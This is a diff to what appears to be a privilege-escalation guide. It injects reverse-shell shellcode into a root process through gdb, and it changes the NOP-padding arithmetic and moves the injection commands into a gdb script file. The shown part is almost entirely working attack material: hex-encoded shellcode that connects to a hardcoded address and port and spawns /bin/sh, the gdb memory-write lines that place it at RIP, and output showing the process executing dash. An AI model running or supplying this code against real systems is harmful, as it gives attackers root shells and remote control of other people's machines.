@@ -631,7 +631,7 @@ buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
 buf += b"\x0f\x05"
 
 # Divisible by 8
-payload = b"\x90" * (8 - len(buf) % 8 ) + buf
+payload = b"\x90" * (-len(buf) % 8) + buf
 
 # Change endianess and print gdb lines to load the shellcode in RIP directly
 for i in range(0, len(buf), 8):
@@ -646,21 +646,23 @@ for i in range(0, len(buf), 8):
 Debug a root process with gdb ad copy-paste the previously generated gdb lines:
 
 ```bash
+# Let's write the commands to a file
+echo 'set {long}($rip+0) = 0x296a909090909090
+set {long}($rip+8) = 0x5e016a5f026a9958
+set {long}($rip+16) = 0x0002b9489748050f
+set {long}($rip+24) = 0x48510b0e0a0a2923
+set {long}($rip+32) = 0x582a6a5a106ae689
+set {long}($rip+40) = 0xceff485e036a050f
+set {long}($rip+48) = 0x6af675050f58216a
+set {long}($rip+56) = 0x69622fbb4899583b
+set {long}($rip+64) = 0x8948530068732f6e
+set {long}($rip+72) = 0x050fe689485752e7
+c' > commands.gdb
 # In this case there was a sleep run by root
 ## NOTE that the process you abuse will die after the shellcode
 /usr/bin/gdb -p $(pgrep sleep)
 [...]
-(gdb) set {long}($rip+0) = 0x296a909090909090
-(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
-(gdb) set {long}($rip+16) = 0x0002b9489748050f
-(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
-(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
-(gdb) set {long}($rip+40) = 0xceff485e036a050f
-(gdb) set {long}($rip+48) = 0x6af675050f58216a
-(gdb) set {long}($rip+56) = 0x69622fbb4899583b
-(gdb) set {long}($rip+64) = 0x8948530068732f6e
-(gdb) set {long}($rip+72) = 0x050fe689485752e7
-(gdb) c
+(gdb) source commands.gdb
 Continuing.
 process 207009 is executing new program: /usr/bin/dash
 [...]
